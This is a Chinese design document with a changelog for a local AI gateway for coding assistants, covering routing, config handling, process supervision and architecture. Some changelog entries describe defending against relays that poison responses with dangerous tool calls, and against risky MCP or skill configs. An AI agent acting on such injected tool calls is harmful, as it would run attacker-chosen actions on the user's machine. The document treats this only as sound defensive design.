另外红叉不需要首次提示——macOS 上关窗不等于退出应用本来就是标准行为，只有 ⌘Q 需要，因为它的肌肉记忆确实是退出。

**顺手修的残留**：资源目标表里还写着「同方言转发额外延迟 < 3ms」，而 §4.1 早就把它拆成了「入站解析加路由 < 2ms」和「响应中继 < 1ms」两项。合成一个数字会让人分不清慢在路由还是网络。


**v2.8** — 立一条产品原则：**对用户来说，UI 和 core 就是一个程序**（§2.2.1）。

技术上是两个进程，但这件事不该泄漏到界面上。四条约束：**退出即全停**，不问「要不要保留后台代理」——那个问题本身就暴露了内部结构；**core 绝不单独注册自启**，用户在系统登录项里只该看到一个东西；**状态是应用的不是 core 的**，菜单栏不该出现「界面正常但 core 挂了」这种描述，内部两个进程的健康状况要合成一个对外状态；**措辞里没有「core」**，界面上说「代理服务已停止」，技术名词留给日志和诊断页。

这条原则顺带修掉了 v2.7 写错的一个备选方案。上一版说「GUI 反复崩溃就把 core 独立注册成 LaunchAgent」——**那和原则冲突，作废**。正确做法是给 GUI 的 plist 加 `KeepAlive` 带 `SuccessfulExit: false`：主动退出（exit 0）不拉起，崩溃（exit≠0）才拉起。这和 §2.2.1 判断「该不该重启」用的是同一个逻辑。v1 仍然不做，但方向记下来免得再想歪。

另外「退出时的 kill 必须可靠」从技术细节升级成**产品承诺的实现**——既然承诺了关掉就全关，留孤儿进程就是违约，SIGKILL 那条路径尤其不能省。


**v2.7** — 补 core 的守护（§2.2.1）。

之前这块只有一句话：「UI 检测到 socket 断开，自动重启，托盘变红并告警」。**那不是守护，那是一句愿望**——按字面实现，core 因为必现问题崩溃时就是个无限重启循环。独立审查当时指出过，之前优先修 blocker 没顾上。

补齐四件事：**三信号检测**（子进程退出事件最快最准但只覆盖自己 spawn 的，socket 断开次之，心跳最慢但唯一能抓到「活着但卡死」）；**指数退避**，第一次立刻重启因为多数崩溃是偶发的，连续五次进安全模式，计数按五分钟窗口算免得偶发崩溃被历史牵连；**安全模式**只起控制面不起数据面，让用户在网关挂掉时还能改配置和回滚——那恰恰是最需要能改配置的时刻；**分级告知**，偶发崩溃自动恢复了不打扰人，进安全模式才打断并自动开窗。

还明确了两条边界：attach 来的 core **检测但不重启**，那是用户自己的进程；后台任务 panic 后，观测类**重启该任务**、数据面核心**整体退出**——带伤运行比重启危险。

记了一个已知缺口：**GUI 挂了没人管**。自启插件生成的 plist 没有 KeepAlive，GUI 崩溃时 core 会因父进程死亡自杀。v1 接受它，因为补上要手写 plist 且会让「主动退出」被立刻拉起，那更糟。


**v2.6** — 静默启动写透（§2.4）。目标行为是 Surge 那样：**开机之后屏幕上什么都不出现，只有菜单栏多一个图标。**

「不显示窗口」只是其中一条，完整是五条：**根本不创建窗口**（不是创建后隐藏，省内存也不会有一帧闪烁）、不抢焦点、**菜单栏图标立刻出现且不等 core 就绪**、只在首次自启后弹一次提示、不出 Dock 图标。

第三条最容易做错：sidecar 启动加 socket 连接加配置加载可能要一两秒，如果图标要等这些做完才出现，用户开机后会有一段「到底启没启」的空白期。所以**图标先出，状态后补**，菜单栏状态表因此多了一个「启动中」。

**「关掉窗口」不等于「退出」**：点红叉和 ⌘Q 都只隐藏，只有菜单栏菜单里的「退出」才真退。⌘Q 那条要特意拦截——退出的代价是所有 AI 客户端立刻失联，不该由一次手滑造成，但第一次拦截时要提示一句。

Dock 图标走**运行时切 activation policy** 而不是 `LSUIElement: true`。后者虽然彻底，但会让 App 永远拿不到前台焦点、没有系统菜单栏、⌘C/⌘V 都要自己实现——我们有 Monaco 编辑器和请求详情，缺了系统菜单很别扭。


**v2.5** — 补开机自启（§2.4）。调研查出一条**直接击中已有设计**的东西。

方案选 **LaunchAgent 自启 GUI、GUI 再拉 sidecar**，和架构同构的 clash-verge-rev 一致。不把 core 单独注册成 LaunchAgent——那要多维护一个后台项、一条升级路径、一处卸载残留，而收益只是「关掉界面代理还在」。

另外三条值得记的：`tauri-plugin-autostart` 写的 plist **只有三个 key**，没有 `KeepAlive`（崩了不自动拉起）也没有 `ProcessType`（默认 Standard 会 throttle CPU 和 I/O，和 §4.1 的 2ms 预算冲突）；plist 存的是**绝对路径快照**，App 一移动就静默失效而 `is_enabled()` 还返回 true；**带隔离属性的 App launchd 直接拒绝执行且完全静默**，本地构建没事，一旦分发就会咬人。

**v2.4** — 补版本号方案（§9.6）。

**应用走 CalVer，库走 SemVer，两套并存。** 不是折衷——它们回答的是不同问题：用户问「这东西多新」，日期最直观；依赖方问「升上去会不会把我弄坏」，只有语义化版本能表达。

格式里有个真坑：**月份不补零**。写 `2026.9.0` 不是 `2026.09.0`，因为 Cargo 和 Tauri 都要求合法 SemVer，而 SemVer 禁止前导零，补零会在 `cargo build` 第一秒就报错。

CalVer 的代价是不表达兼容性，所以真正需要协商的地方各自有独立版本号：配置 schema 决定要不要跑迁移，控制面 API 让客户端连上来时检查。隐藏好处是**一眼看出多久没更新**——`1.4.2` 看不出是上周还是三年前，`2026.9.0` 一眼就知道，对准备开源的项目这是用户第一眼要判断的事。


**v2.3** — MCP / skill 那块简化，推翻 v2.2 的主清单设计。

上一版我设计了「`config.yaml` 里一个 `mcp:` 段作主清单，各客户端是它的投影」。**那是错的**：各客户端的配置文件本来就是真相源，引入主清单等于凭空造出第四份真相，然后要处理「不一致时听谁的」——一个我们自己制造出来的问题。这和 §3.1 「配置只有一份」是同一个逻辑，我上一版没贯彻。

改成**查看器加复制工具**：打开页面时扫一次、结果只在内存、不写任何文件；点矩阵格子执行一次复制，然后重新扫描刷新。没有「同步状态」这个概念，也就没有「同步失效了」这类问题——你看到的永远是磁盘上此刻的真实情况。

「从所有客户端移除」这个操作顺带替代了原来设计的 `enabled: false` 应急开关，而且更直接:它真的删了，不留「禁用但还在配置里」的中间状态。

明确不做的：主清单、持续同步、enabled 状态、变更历史、skill 搬动。**这些是故意不要**，每一样都会引入一份需要维护的状态，而这个功能的价值恰恰在于它不维护任何状态。

整块放 M4，写入复用接管那套机制，增量很小。


**v2.2** — 补客户端支持矩阵和 MCP / skill 集中管理（§7.11、§7.12）。

**客户端拆成两张表。** 初稿混成了一张，漏掉「不走 API 端点但有 MCP 配置」的那类——最典型的是 **Claude Desktop**，它是订阅制接管不了，但有 MCP 配置而且那是危险度第二的攻击面，漏掉它等于扫描留了个洞。接管表从 6 个补到 9 个（加 Aider、Continue、Cline）。

**MCP 管理比 cc-switch 的「同步」多一层。** 问题的实质不是「配置散在多处很烦」，而是**你根本不知道自己装了什么**——五个客户端十几个 server，每个都是能执行任意程序的入口，没有一个地方看得全。所以顺序是清单、审查、再谈同步。

其中有一条必须讲在前面：**同步是分发，而分发会放大风险**。把一个有问题的 server 同步到五个客户端等于攻击面乘以五，所以扫描不是附加功能而是同步能力成立的前提。这正好复用 §5.3 的规则集，边际成本几乎为零，而 cc-switch 做不到——它没有扫描能力。

**skill 更保守**：只做清单和扫描，不做同步。MCP 的配置是结构化的几行可以机械转换，skill 是一个目录而且跨客户端格式还没有事实标准。

排期拆两半：只读（汇总、矩阵、扫描）在 M4 跟接管一起做，写入（同步）排 M6+。


**v2.1** — 四条决策落定，外加一次自我纠错。

**安全改成三态**：`off / observe / enforce`（关闭 / 观察 / 拦截），出厂停在**观察**。比原来的 `enabled: false` 加 `shadow_mode: true` 清爽——那是两个字段表达一件事，用户得在脑子里做一次组合才知道当前状态。第三态在每道防线上的动作不同（脱敏是**替换**、审查是**切断**、扫描是**告警**），UI 上显示各自的动词。

**推翻上一版的「整块缓冲」，改回流式尽力阻断。** 我上一版认定流式下拦不住工具调用，因为等拼出完整命令前面字节已经转发了。**这个判断错在一个关键处：不完整的工具调用本身就是安全的**——客户端拿到截断的 `input_json_delta`、没有 `content_block_stop`，解析不出参数，根本执行不了。所以正确做法是流式扫描、命中即切断：零延迟、触发更早（模式一出现就切，不用等参数下发完）、客户端体验正常。整块缓冲的代价明确而收益几乎为零，删掉。

**三条决策**：前端栈用 React 19 + TS + Tailwind v4 + shadcn/ui + TanStack + uPlot；**中英双语**，首次启动跟随系统语言，core 侧不做 i18n（错误和日志一律英文，因为它们会被复制进 issue 和被工具解析）；隐私**零上传**。

待决策清单**清空了**。下一个决策点在 M2 第一周，等 YAML span 精度的实测数据。


**v2.0** — 一次独立评审后的大修。评审提了 36 条，这里落实了其中影响架构的部分。

**四个架构级矛盾**（不修就没法开工）：

| 问题 | 修法 |
|---|---|
| §4.1「同方言不解析 body、3ms 直通」与 §3.4「按 token 数、是否带工具路由」互斥 | 按方向切分而非按方言：**入站恒解析，出站与响应才直通**。延迟指标拆成解析预算和中继预算两项。`input_tokens` 明令走本地估算，禁止在热路径调 `count_tokens`（那是网络往返，且需要先知道 provider，构成鸡生蛋） |
| `session_cost` / `turn` / 会话粘滞都要在路由前拿到会话标识，但只定义了离线的时间窗聚类 | 分成**在线会话键**（管线第 1 步算 `blake3(system_prompt ‖ 首条 user message)`）和展示层聚类两件事 |
| `provider_would_be` 是循环依赖：guard 要在发请求前生效，但它的值要路由完才知道 | **两阶段求值**，且含该条件的规则禁止带 `to`。故障转移换了 provider 后要回到阶段二重算 guard |
| 脱敏在全局 / provider / route 三处都能配，没有优先级 | 全局是总闸，provider 定类别，route 的 guard **只能收紧不能放松** |

**一个不可实现的设计**：§5.2 说「高危拦截 = 中断响应流」，但 Anthropic 的工具参数是 `input_json_delta` 分片下发的，等拼出完整命令前面字节早转发了。改为 `strict` 模式**整块缓冲 tool_use**，并如实写出「带工具的响应增加一次块级延迟」这个代价。

**一处打脸的实证**：§3.3 那个旗舰配置示例自己就是非法的，`to: long-ctx-pool` 指向一个从未定义的策略组。已补全并加了一条硬规矩：**§3.3 是配置的唯一权威示例**，别处的 YAML 片段必须能在这里找到对应字段。

**两个被高估的论证**：网关密钥说成能防本机进程，但它明文躺在 `settings.json` 里同一个进程读一下就有——如实改成「客户端归属识别 + 挡住随手一发」；不拆二进制的「决定性理由是版本 skew」，而 skew 依赖自动更新器，那是个已决定暂不存在的东西——理由换成「一次编译一次测试」。

**一个反直觉的代价**：`set: {model}` 降级会作废整个 prompt cache，而「预算超了」恰恰发生在缓存已暖好的长会话里，**很可能比不降级更贵**。补了 `only_at_session_start` 和成本提示。

**一个自己犯的错**：全文对第三方 skill 高度警惕，却没把同样的警惕用在自己的配置文件上——「跑一条命令拿密钥」加上「鼓励分享配置」等于远程执行。结论是不做这一类凭据，见 §3.2。

**补四块缺失**：错误契约（七种失败源各自的方言原生 error body、`x-thinkwatch-error` 头、`[ThinkWatch]` 前缀）、价目表来源与模型名归一化、首次运行的五步闭环、YAML patcher 的三层测试护栏（它写用户唯一的配置文件，而全文最重的教训就是「程序写坏了用户配置」）。

**排期上修 2.5 倍并调换顺序**：9–11 周改为 **19–24 周**。原方案先做配置同步再做路由，现在反过来——先要有能用的东西。另把影子模式里最便宜的出站密钥检测提前到 M3，让证据从早期开始攒。


**v1.4** — 一次全面 review，补缺口、修残留、重排工期。

**修掉三处改版残留**：`crypto.rs` 的定位还停留在「§3.2 要用它」（§3.2 早改成明文了）；WS 代理的排期写成 M4（M4 现在是数据面守卫）；UI 页面清单里还叫 Rules，且漏了 Security 页。

**发现一个设计错误**：provider 超时默认 300 秒，而 Claude Code 的默认请求超时是 600 秒——一个真跑六分钟的深度思考任务会被我们掐断，而客户端看到的是我们的错误不是上游的真实情况。改成分段超时（连接 10s、首字节 60s、空闲 60s、**整体无限**），原则是「我们不该是先放弃的那个」。

**补五块缺失内容**：§4.7 常驻进程的现实问题（超时、并发排队、睡眠唤醒、崩溃恢复）、§3.1 的 schema 版本迁移、§8 的磁盘不足处理、§12 隐私立场（零上传）、§7 补 Security 页。其中贯穿一条原则：**观测功能的失败绝不能影响数据面**。

**M1 拆成两半**：原本塞了十个独立工作块只给两周。现在 M1 只做配置同步，M1.5 做路由与代理。全程 11–13 周。


**v1.2 / v1.3** — 补出站代理（§3.7）和测速（§4.6）。

**代理是命名实体**，声明一次到处引用，不同上游可以走不同代理。`direct` 和 `system` 内置，默认是 `direct` 而不是跟随系统——否则用户在系统里开了全局代理，本地 Ollama 会莫名连不上而配置文件里看不出线索。三个实现要点：`socks5h` 让 DNS 在代理端解析（本地 DNS 不可信时是决定性的）、代理绑在 `reqwest::Client` 上所以每个 provider 一个独立 Client、代理挂了默认让请求失败而不是静默降级到直连。

**测速分三层，成本递增**（v1.3 修正）。初稿把「测网络」和「测模型」混成了一件事，直接设计成发一个真实请求——那是错的，绝大多数时候你只想知道这条线通不通、快不快，不需要惊动模型。

| 层 | 测什么 | 成本 |
|---|---|---|
| L1 | DNS / TCP / TLS 握手分段 | 零。代理测速到此为止 |
| L2 | `GET /v1/models`，验证 key 与服务 | 零，该端点不计费 |
| L3 | 真实请求的 TTFT 和 tok/s | 花钱，**触发前必须显示预估 token 与金额** |

L3 的确认框要覆盖四种情况：正常计费显示金额、订阅型显示「不计费但消耗 N tokens」、价格未知显示 token 数、批量测速列出每项并给总计。测完显示实际消耗，因为上游可能附加 system prompt。

日常监控数据仍然来自真实流量而非探测：每个真实请求都是一次测量，测的正是实际在用的模型和上下文长度。`url-test` 策略组样本不足时用零成本的 L1 补，不用 L3。

**v1.1** — 补 §9.0 依赖全景图，澄清两个容易误解的地方。

**core 里没有「企业版的那一层」**：多租户、RBAC、审计、ClickHouse 这些全留在 `ThinkWatch` 仓库。不只因为桌面版用不到，更因为 License 方向——MIT 的 core 能被 BUSL 依赖，反过来不行，把企业版特有代码放进 MIT 库法律上和语义上都是错的。

**CLI 也不是一层**：它是 `twcore` 里的一组子命令，依赖第二层的 `tw-api`。所以 core 是两层加一个 bin，而消费者有四个（企业版、`twcore serve`、CLI、Tauri UI）——消费者数量和层数不是一回事。


**v1.0** — 回答仓库、crate、二进制三个层面的拆分问题（§9.5），并按此重排 crate 划分（§9）。

**不要第四个仓库。** CLI 和网关是同一个演进单元，控制面 API 改一次两边都要跟，跨仓库会把一次提交变成两个 PR 加两次发版加一张版本兼容矩阵。而「独立安装 CLI」这个唯一收益，用一个 feature flag 就能拿到。

**但这个问题暴露了 core 的身份冲突**：它同时是「给企业版复用的协议层」和「桌面版的完整引擎」，而后者企业版永不依赖。解法不是拆仓库，是**在仓库内部把 crate 分成两层**并在 README 里画出这条线——第一层是契约，改动要同步验证企业版；第二层随便改。这条线按「谁会受影响」划，比仓库边界有用。

顺带确认另一条边界：**引擎住 core，lite 仓库里只有 UI**。这样 core clone 下来就是一个能跑的 headless 网关，服务器和 Docker 场景不必碰桌面仓库。

crate 层面独立出 `tw-api` 承载控制面契约；二进制层面不拆，主要理由是同一 workspace 一次编译一次测试；版本 skew 是将来分发时的加分项，不是现在的理由。

**v0.8** — 四条修正，其中路由规则是整章重写。

| 改动 | 内容 |
|---|---|
| **§3.4 路由规则推倒重来** | 初稿把 Clash 的 `TYPE,VALUE,TARGET` 语法整个搬了过来，连 `AND,((…),(…))` 的括号嵌套都照抄——那是为「匹配目标地址」设计的形状，不是为「匹配请求性质」的。改成结构化 `when` 对象，补上 `thinking` / `turn` / `session_cost` / `tool_count` 四个网络代理里根本不存在的维度，动作从只能 `to` 扩展到 `set` / `guard` / `deny` |
| **§3.2 密钥进 YAML** | 不用 keychain。连带删掉 `secrets.db`、master key、加密和 Linux 降级路径。配套四条缓解措施，外加环境变量插值这一个逃生舱（§3.2） |
| **§5.0 安全默认全关** | 出厂只开**影子模式**：照常检测，只记录不动作。攒一周数据后用「有 3 个请求把你的 key 发给了 relay-cn」这种具体证据引导开启，而不是一句功能介绍 |
| **§9.4 补上 core 的调用接口** | 上一版只说了「用路径依赖」。补齐三个接缝的签名、两边各自的构造代码、四步迁移方案、以及什么进 core 什么不进的边界清单 |


**v0.7** — 补 macOS 菜单栏常驻显示（§7.4）。

Surge 在菜单栏放上下行速率，我们放**今日花费和输出速率**——流量是网络代理的核心指标，钱才是 AI 网关的。八个指标可配，两行任选。

两个设计结论：**状态编码比数字更重要**，因为菜单栏是余光扫的，所以安全拦截时变色比发系统通知更可靠；**两行显示必须自己渲染位图**，已查证 Tauri 2 的 `Image::new_owned` 接受运行时 RGBA buffer 且不需要 feature flag，而 `set_title` 只能单行。附三个实现坑：宽度抖动、模板图与彩色告警冲突、刘海机型的空间。


**v0.6** — 两条否决，都改对了。

| 改动 | 内容 |
|---|---|
| **配置回到单文件** | 撤销 v0.5 的三层拆分。就一份 `config.yaml`，UI、CLI、手改全落这里。多一份文件就多一份心智负担，而 Clash 的真问题（没有 API、改写丢格式、同步做不对）没有一件需要靠多加文件来解决。临时试验的需求改由**变更历史加回滚**承担，更简单也更通用 |
| **不改名** | 维持 ThinkWatch Lite。20 个候选的核验数据存档在 §14 备查。顺带解除了「改名要赶在写入密钥之前」的时间压力 |


**v0.5** — 配置读写重新设计，命名有结论。

| 改动 | 内容 |
|---|---|
| **§3.1 确立单文件模型** | 就一份 `config.yaml`，UI、CLI、手改全落这里。Clash 难用不是因为只有一份文件，而是没有 API、改写丢格式、同步做不对——这三件都不需要靠多加文件来解决 |
| **新增 §3.8 配置双向同步** | API 改配置由 core 写回文件，同时保留手改文件的热重载。四个真问题逐个解：最小文本替换保住注释格式、写入指纹防回环、乐观并发防覆盖、校验失败保持旧配置继续服务。附完整的配置 API 和 CLI |
| **命名维持现状** | 核验的 20 个候选全部出局（**Interlock 是活跃勒索软件团伙**，Bastion 和 Tollbooth 各有功能重合的同名项目）。决定不改名，数据存档在 §14 |
| 里程碑 | M1 的主体从规则引擎改为配置同步，第一周先验证 YAML 的 span-to-patch 精度 |


**v0.4** — 安全成为第一差异化，反向依赖提前到 M0。

| 改动 | 内容 |
|---|---|
| **新增 §5 安全：三道防线** | 出站脱敏、入站审查（防中转站投毒）、静态扫描（skill / hook / MCP 配置），加上本地访问控制（网关密钥、监听地址）。这是唯一别人短期抄不走的部分——需要网关位置、客户端配置可见性、请求历史三者同时具备 |
| **反向依赖提前** | 上一版建议推迟到 M4，改为**现在就做**，但按接口稳定性分三层：provider / protocol / secret / resil 立即切，pricing / engine 等 M2，gateway / control / store 可能永不切 |
| **新增 §0.5 不抄代码纪律** | sub2api 是 LGPL-3.0，抄了会污染 MIT core，法律上就不允许；cc-switch 是 MIT 但也不抄。只做功能性参考 |
| 里程碑重排 | 安全拆成三处跟随基础设施，新增 M4 数据面守卫，原深水区顺延为 M5 |


**v0.3** — 六条决议并入。三条已拍板（License 走 MIT、只做 macOS、暂不分发），三条待定（前端栈、方言互转、产品名）。另有三处实质变化：

| 改动 | 内容 |
|---|---|
| 复用范围大幅上修 | 逐文件核查后，可直接搬 10,277 行（CLEAN），小改后 12,308 行，占三个 crate 的 46%。初稿估的 3,900 行严重偏低。见 §9.1 |
| 新增凭据类型维度 | 原方案假设「凭据 = 静态 API key」太窄。改为四类，含 OAuth，并给出接入 sub2api 这类账号池网关的三个集成细节。见 §3.6、§4.3.1 |
| 分发相关全面降级 | 不对外分发就不需要公证，`tauri#11992` 和证书问题一起消失。M0 第一周从「验证签名链路」改成「直接搬代码」 |

另外查到一条负面情报：原本要推荐的产品名 Switchyard 被 NVIDIA NeMo 在 2026-09-02 用于同领域的 Rust LLM 代理，不能用。改推 Patchbay。见 §14。


**v0.2** — 一轮外部调研后的修订。三处改了设计决策，不只是补充：

| 改动 | 原方案 | 现方案 | 依据 |
|---|---|---|---|
| 控制面通信 | 127.0.0.1 + 随机 token | **unix socket 0700**，TCP+token 降为可选且默认关 | clash-verge-rev 就是这么做的。文件权限由内核按 uid 强制，强过本机 token |
| core 形态 | 单一 bin，Tauri spawn sidecar | **lib + 薄壳 bin 双形态** | `tauri#11992` 开着且无 workaround，`externalBin` 会让公证失败。双形态让退路只改 UI 代码 |
| Cursor 接管 | 列为可一键接管 | **降级为手动配置指引** | 它没有配置文件，且 Tab 补全不走网关 |

另外补入：cc-switch 六个覆写类 issue 的实证（§1）、sidecar 签名与进程回收的实际语义（§2.2、§2.3）、五个客户端查证过的配置字段与接管代价（§7.11）。

**v0.1** — 初稿。

## 0. 一句话定位

**面向个人开发者的本地 AI 网关。**

你的 Claude Code / Codex / Cursor 只配置一次 `http://127.0.0.1:8788`，之后所有的供应商切换、模型路由、限额、观测，全部在本地这一层完成——不改环境变量，不重启客户端。

它做三件事，缺一不可：**路由**（按规则把请求分发到不同上游）、**观测**（看见每一次调用的成本、延迟、缓存命中）、**守卫**（§5：防止密钥泄露给中转站，防止中转站往响应里投毒，扫描本机 AI 客户端的配置面）。

第三件是最容易被低估、也最难被抄走的——它需要同时占据网关位置、看得见客户端配置、留有请求历史。

对标关系：

| | 它做什么 | 我们对应的东西 |
|---|---|---|
| **cc-switch** | 改配置文件切供应商 | 被完全取代（见 §1） |
| **Surge** | 网络流量的规则路由 + 实时观测 | 交互范式和 UI 骨架照搬 |
| **Clash / mihomo** | core/UI 分离，配置即代码 | 架构照搬（见 §2） |

---

## 0.5 一条前置纪律：不抄代码

**sub2api 和 cc-switch 只做功能性参考，一行代码都不抄。所有东西自己实现。**

除了偏好，这里还有一条硬约束：

| 项目 | License | 后果 |
|---|---|---|
| **sub2api** | LGPL-3.0 or later | **法律上就不能抄。** LGPL 有传染性，抄进 MIT 项目会污染整个 core，连带影响企业版对 core 的依赖 |
| **new-api** | AGPL-3.0 | **同上，而且更严。** AGPL 的传染性覆盖网络服务，比 LGPL 更麻烦 |
| **one-api** | MIT | 法律上允许，但不抄 |
| **cc-switch** | MIT | 同上 |

§3.9 的模型目录设计大量参考了 one-api 和 new-api 的**行为差异**——它们在同一个问题上做出了不同选择，其中一个是错的，这个对比比任何一方的代码都有价值。但两边的 Go 代码一行都不进我们的仓库。

执行方式：

- **可以做的**：观察它们的外部行为、读 issue 和文档、分析它们的设计选择为什么导致了那些 bug。本方案 §1 对 cc-switch 六个覆写类 issue 的分析，就是这种参考——我们从中提取的是「整体覆写配置文件是错的」这个教训，不是它的代码。
- **不做的**：不照着源码写实现，不搬数据结构，不移植算法。对 LGPL 的 sub2api 尤其要保持距离，最稳妥是根本不打开它的源码目录。
- **留痕**：设计文档里标注功能灵感来源，代码和提交历史里不出现任何来自它们的片段。

唯一的代码复用来源是**自己的企业版**（§9），那是版权归属明确、可以自由重新授权的资产。

---

## 0.6 一条产品纪律：配一个 API 就能用

这份文档到后面会积累不少能力：路由规则、分组、客户端身份、三态安全、预算、并发限制、代理、脱敏、MCP 扫描。**每一条单独看都成立，加在一起就可能压垮一个只想把 Claude Code 指到自己买的中转站的人。**

所以先定一条贯穿全文的纪律，它同时约束配置格式、默认值、UI 和错误信息：

> **用户只配一个 base_url 和一个 key，这个产品就应该完整可用。**

「完整可用」不是「能转发就行」。观测、成本统计、菜单栏指示、一键接管、安全的观察态——全都在。**不是功能阉割版，是同一个产品的自然形态。**

### 三条推论

**一、默认值的判据：不需要用户拥有任何额外的东西。**

这条判据很好用，因为它能一票否决很多「看起来很聪明」的默认值。

举个真实的例子（§4.8）：客户端发的探测请求可以本地应答，也可以路由到一个便宜的上游。**本地应答不需要用户有任何东西，所以它是默认；路由到别处需要「别处」存在，所以它只能是选项。**

同一条判据也解释了为什么价目表要内置一份（§4.3.0）而不是首次运行时联网拉——联网需要用户有网，而首次运行恰恰是最不该失败的时刻。

**二、高级功能要有触发条件，条件不满足就不出现。**

注意这不是「折叠到高级设置里」。折叠面板仍然在告诉用户「这里有你不懂的东西」，那种焦虑不比直接显示小多少。

**但触发条件要绑在「这个功能解决的问题存在吗」上，不能绑在某个数量上。** 数量是偷懒的代理指标，很容易绑错——比如把「路由」整体绑到 provider 数量，就会把**单上游多模型**这个最常见的场景一起挡在门外。

| 功能 | 出现的条件 |
|---|---|
| **模型路由**（改写模型名、按模型限额、长上下文走别的模型、按客户端指定模型） | **一直有。** 一个上游就有几十个模型，这个问题从第一天就存在 |
| 故障转移与优先级 | 有 ≥2 个 provider |
| 分组与负载均衡 | 有 ≥3 个 provider，且其中至少两个同类 |
| 按客户端分流到不同上游 | 有 ≥2 个 provider **且** ≥2 个客户端在发请求 |
| 预算与配额 | 用户主动去找，或成本触发一次提示之后 |

第一行和后面几行的区别值得说清楚：**「让 opus 实际打到 sonnet 省钱」和「A 挂了切到 B」都叫路由，但前者只需要一个上游，后者需要两个。** 把它们合成一个「路由」开关，就会让只有一家中转的用户失去他最需要的那个功能。

所以准确的说法是：只有一个 provider 的用户不会看到**故障转移、优先级、分组**这些词——那些概念对他确实不存在；但**模型路由从第一天就该在**。

**三、先有行为，后有概念。**

用户点「再加一个供应商」，我们自动建立故障转移关系，然后告诉他：**「配好了，`relay-a` 挂掉时会自动切到 `relay-b`」**。他不需要先学什么是 group、什么是 route、优先级怎么排。

网关密钥最需要这样处理。客户端识别靠密钥（§3.3.1），这个机制是对的，但它对用户是纯粹的额外负担——「我为什么要为每个客户端生成一把 key？」

所以：**默认只有一把，所有客户端共用。** 需要区分时，入口不是「生成第二把密钥」，而是**「我想让 Codex 走不同的上游」**——点下去我们自动生成密钥、写进 Codex 的配置、建好那条规则。用户全程不需要理解「密钥即身份」，他只表达意图。

### 一个反面判据

每加一个功能，问一句：

> **一个只配了一个 API 的用户，会因为这个功能而多看到一样东西吗？**

如果会，那它要么需要一个触发条件，要么需要重新设计。这个判据要用在功能评审上，不是写完之后的自查。

---

## 1. 为什么不是 cc-switch

cc-switch 的心智模型是「改配置文件 + 重启客户端」。这个模型有天花板：

1. **切换是全局且离散的。** 要么全走官方，要么全走中转。没法表达「Opus 走官方保质量，Haiku 走中转省钱，超长上下文走支持 1M 的那家」。
2. **每次切换要重启。** Claude Code 重启意味着丢会话。为了省几毛钱重开一个跑了半小时的任务，没人愿意。
3. **切完了没有反馈。** 这家中转是快了还是慢了？今天花了多少？哪个模型最烧钱？不知道。切换全靠体感。
4. **故障要手动处理。** 供应商挂了，先卡住，再意识到，再打开工具切换，再重启客户端。整个链路以分钟计。
5. **配置文件是共享可变状态。** 你手改过 `settings.json`，工具再写一遍，谁赢不确定。

**这些不是推测，是它 issue 区里的实况。** cc-switch 有 13.1 万 star 和 2595 个未关闭 issue，市场需求被验证得很充分，但同一类缺陷反复出现：

| Issue | 症状 |
|---|---|
| #6902 | 应用一个 provider 配置**整体覆写** `~/.claude/settings.json`。实测现场：原文件 23 个顶层键约 10 KB，provider 里只存了 `{"env":{}}`，结果 22 个键全丢——hooks、permissions、plugins、UI 设置 |
| #6901 | 同一覆写擦掉第三方 hooks |
| #6871 | 模板覆写删掉 `enabledPlugins`，所有插件显示为禁用 |
| #6889 | 开启路由会删掉 `ANTHROPIC_MODEL`，客户端退回内部默认名，代理不认，报 `unrecognized_model` |
| #6828 | `settings.local.json` 里的残留 env 遮蔽切换，静默不生效 |
| #6785 | 原子写破坏符号链接配置，dotfile 管理器的软链被换成普通文件 |

3.20.1 没有修掉这一类，全部仍然开着。根因是它把 SQLite 当唯一真相源，把客户端配置文件当**派生产物**整体重写。

Lite 的心智模型是「客户端指向本地，本地做决策」。切换从**配置操作**降级成**运行时路由**——和 Surge 相对于手动改系统代理设置是同一种跃迁。

代价很诚实：多了一个必须常驻的本地进程。所以 core 的稳定性和资源占用是第一优先级，见 §4.5。

---

## 2. 架构：core / UI 分离

```
┌──────────────────────────────────────────────────────────────┐
│  thinkwatch-lite  (Tauri 2)                        桌面 UI    │
│  React 19 + TypeScript + Tailwind v4 + shadcn/ui              │
│  托盘常驻 · 主窗口按需                                          │
└────────────────────────┬─────────────────────────────────────┘
                         │  REST + WebSocket
                         │  unix socket (0700)  —  TCP+token 为可选
┌────────────────────────▼─────────────────────────────────────┐
│  twcore   独立进程（Tauri sidecar，也可单独 daemon 运行）        │
│                                                               │
│  ┌─────────────────────┐   ┌───────────────────────────────┐ │
│  │  Control Plane      │   │  Data Plane                   │ │
│  │  control.sock       │   │  :8788  (固定，客户端指向这里)  │ │
│  │  /config /providers │   │  POST /v1/messages            │ │
│  │  /routes /requests  │   │  POST /v1/chat/completions    │ │
│  │  /models            │   │  POST /v1/responses           │ │
│  │  WS   /events       │   │  GET  /v1/models      ← §3.9  │ │
│  └─────────────────────┘   └───────────────────────────────┘ │
│                                                               │
│   配置(YAML) · 规则引擎 · Provider 池 · 健康检查 · 观测        │
└────────────────────────┬─────────────────────────────────────┘
                         │
     Anthropic 官方 / OpenAI / Gemini / 各家中转 / Ollama / vLLM
```

### 2.1 为什么拆进程，而不是把 core 编译进 Tauri

1. **core 能脱离 GUI 独立跑。** 放服务器上、塞进 Docker、做成开机 daemon、在 CI 里当 mock 网关——都不需要图形界面。这是 clash 生态能繁荣的根本原因，而 cc-switch 这类工具做不到。
2. **UI 崩溃不断流。** 你在改配置时手滑让前端白屏，正在跑的 Claude Code 任务不受影响。数据面和控制面的故障域必须隔离。
3. **UI 可替换。** 将来有人想写 TUI、Web 面板、或者 Raycast 扩展，对着同一套 control API 写就行。
4. **升级节奏解耦。** core 是热路径，改动要保守；UI 是外围，可以快速迭代。

代价是进程管理和 IPC 的复杂度。这个代价值得付。

### 2.1.1 core 做成「lib + 薄壳 bin」双形态

`tw-core` 是 lib crate，`twcore` 是它上面几百行的 bin 壳。这样 UI 侧有两条可选的启动路径：

- **默认**：Tauri 通过 `externalBin` spawn `twcore` 进程（本方案的主路线）
- **保险**：Tauri 直接 link `tw-core` 跑在进程内

**决定不分发之后，这条从「必需品」降成「顺手为之」，但仍然要做。**

原本的紧迫理由是 `tauri#11992`：配了 `externalBin` 就公证失败，而这个 bug 至今开着。既然当前不公证，这个风险暂时不触发。

但双形态还是值得保留，因为它的成本几乎为零而收益是长期的：

- `twcore` 本来就要能独立做服务端和 CLI，lib/bin 分离是这个需求的自然结果，不是额外工作。
- 哪天想发给别人，退路现成——撞上 `#11992` 就切进程内模式，`tw-core` 一行不改。
- 企业版将来反向依赖 core 时（§9.3），它依赖的就是 lib，不是那个 bin 壳。

